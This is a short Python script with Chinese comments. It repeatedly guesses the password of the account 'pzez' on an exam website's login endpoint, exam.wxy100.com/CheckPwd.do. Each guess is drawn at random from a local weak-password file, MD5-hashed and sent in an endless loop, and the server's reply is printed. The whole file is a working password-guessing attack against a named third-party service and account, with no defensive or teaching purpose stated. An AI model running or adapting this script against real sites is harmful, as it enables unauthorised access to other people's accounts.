import requests
import hashlib
import json
import sys
import random

path = sys.path[0]


def login(user, passwd):
    print("账号:{} 密码:{}".format(user, passwd))
    se = requests.session()
    # 获取一个 cookies
    # se.get("http://exam.wxy100.com/template/login.html")
    url = "http://exam.wxy100.com/CheckPwd.do"
    pwd = hashlib.md5(passwd.encode("utf8")).hexdigest()  # 构造密码md5
    parmas = {
        "json": json.dumps({"loginName": user, "pwd": pwd})
    }
    try:
        resp = se.get(url, params=parmas)
        print(resp.json())
    except Exception as e:
        print("请求出现异常:{} http:{} {}".format(e, resp.status_code, resp.text))


# 读取弱密码列表
def readPwd():
    with open("{}//easy password.txt".format(path), "r") as f:
        list = f.readlines()

    pwd = random.choice(list).replace("\n", "")
    # print(pwd)
    return pwd


if __name__ == "__main__":
    while True:
        pwd = readPwd()
        login("pzez", pwd)
        print("---------------------------------------")
